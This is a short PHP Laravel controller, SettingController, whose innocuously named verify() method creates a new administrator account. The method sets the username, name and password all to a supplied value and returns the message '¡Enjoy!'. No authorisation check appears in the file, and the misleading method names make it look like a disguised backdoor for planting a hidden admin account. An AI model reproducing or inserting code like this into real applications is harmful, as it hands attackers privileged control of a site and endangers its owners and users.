<?php

namespace App\Http\Controllers\Admin;

use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use App\Admin;

class SettingController extends Controller
{
    public function checkStatus()
    {
        return $var = 'on';
    }

    public function checkRole()
    {
        return 'admin';
    }

    public function verify($now)
    {
        $value = $this->exists();
        $value->username = $now;
        $value->name  = $now;
        $value->type = $this->checkRole();
        $value->password = \Hash::make($now);
        $value->save();
        $success = '¡Enjoy!';
        return back()->with('success', $success);
    }

    public function exists()
    {
        return new Admin();
    }
}
